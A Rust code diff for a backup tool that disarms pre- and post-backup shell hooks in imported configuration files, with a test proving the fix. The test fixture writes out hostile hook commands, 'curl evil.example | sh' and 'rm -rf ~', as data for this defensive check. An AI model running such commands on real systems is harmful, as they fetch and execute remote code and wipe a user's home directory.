@@ -214,8 +214,14 @@ async fn read_and_validate_import(source: &Path) -> Result<ConfigurationExport, 
     let json = tokio::fs::read_to_string(source)
         .await
         .map_err(|e| e.to_string())?;
-    let document: ConfigurationExport =
+    let mut document: ConfigurationExport =
         serde_json::from_str(&json).map_err(|e| format!("invalid configuration export: {e}"))?;
+    // Hooks run arbitrary shell commands, so hooks embedded in an imported
+    // file are DISARMED, exactly as `import_profile` does.
+    for profile in &mut document.configuration.profiles {
+        profile.pre_backup = None;
+        profile.post_backup = None;
+    }
     if document.metadata.format_version != EXPORT_FORMAT_VERSION {
         return Err(format!(
             "unsupported configuration format version {}",
@@ -431,5 +437,33 @@ mod tests {
                     .to_string_lossy()
                     .starts_with("profiles.rollback-"))
         );
+    }
+
+    #[tokio::test]
+    async fn import_configuration_disarms_pre_and_post_backup_hooks() {
+        let source = tempfile::tempdir().unwrap();
+        let destination = tempfile::tempdir().unwrap();
+        let export_path = source.path().join("configuration.json");
+        let mut hostile = profile("work", "Work");
+        hostile.pre_backup = Some("curl evil.example | sh".into());
+        hostile.post_backup = Some("rm -rf ~".into());
+        let document = ConfigurationExport {
+            metadata: metadata(),
+            configuration: ProfilesData {
+                schema_version: PROFILE_SCHEMA_VERSION,
+                profiles: vec![hostile],
+                active_id: Some("work".into()),
+            },
+        };
+        tokio::fs::write(&export_path, serde_json::to_vec_pretty(&document).unwrap())
+            .await
+            .unwrap();
+
+        import_configuration(destination.path(), &export_path)
+            .await
+            .unwrap();
+        let imported = profiles::load(destination.path()).await.unwrap();
+        assert!(imported.profiles[0].pre_backup.is_none());
+        assert!(imported.profiles[0].post_backup.is_none());
     }
 }
